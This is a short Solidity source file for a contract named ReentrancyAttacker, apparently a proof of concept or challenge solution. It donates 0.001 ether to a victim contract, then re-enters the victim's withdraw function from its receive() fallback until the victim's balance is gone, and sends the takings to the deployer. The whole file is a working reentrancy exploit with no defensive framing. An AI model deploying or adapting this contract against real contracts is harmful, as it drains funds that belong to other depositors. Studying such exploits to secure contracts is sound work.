// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ReentrancyAttacker {
    address payable victimAddr;
    address payable owner;

    constructor(address payable _victimAddr) payable /* send 0.001 ether */ {
        victimAddr = _victimAddr;
        owner = payable(msg.sender);
    }

    function withdraw() external {
        owner.transfer(address(this).balance);
    }

    function attack() external {
        // victim-contract's balance is 0.001 ether
        // so if we send 0.001 ether as a donation we can withdraw 0.001 ether first and withdraw contract's 0.001 ether next through Reentrancy
        (bool donate_success, ) = victimAddr.call{value: 0.001 ether}(
            abi.encodeWithSignature("donate(address)", address(this))
        );
        require(donate_success);

        _withdrawFromVictim();
    }

    receive() external payable {
        if (msg.sender == victimAddr) {
            uint256 victimBalance = address(victimAddr).balance;
            if (victimBalance > 0) {
                _withdrawFromVictim();
            }
        }
    }

    function _withdrawFromVictim() internal {
        (bool withdraw_success, ) = victimAddr.call(
            abi.encodeWithSignature("withdraw(uint256)", 0.001 ether)
        );
        require(withdraw_success);
    }
}
